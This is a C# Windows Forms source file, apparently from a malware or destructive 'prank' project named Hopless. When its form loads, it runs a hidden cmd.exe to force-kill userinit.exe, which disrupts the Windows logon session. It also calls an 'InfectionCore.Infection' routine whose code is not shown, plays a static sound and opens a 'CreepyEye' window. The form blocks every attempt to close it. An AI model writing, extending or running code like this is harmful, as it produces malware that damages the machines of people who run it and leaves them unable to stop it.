using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Hopless
{
    public partial class Static : Form
    {
        public Static()
        {
            InitializeComponent();
        }

        SoundPlayer sound;

        private void Static_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async void Static_Load(object sender, EventArgs e)
        {
            ProcessStartInfo k = new ProcessStartInfo();
            k.FileName = "cmd.exe";
            k.Arguments = "/k taskkill /f /im userinit.exe";
            k.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(k);
            
            InfectionCore.Infection();
            using (var fs = Properties.Resources._static)
            {
                sound = new SoundPlayer(fs);
                sound.Play();
            }
            await Task.Delay(15000);
            sound.Stop();
            this.Hide();
            await Task.Delay(50);
            CreepyEye ce = new CreepyEye();
            ce.Show();
        }
    }
}
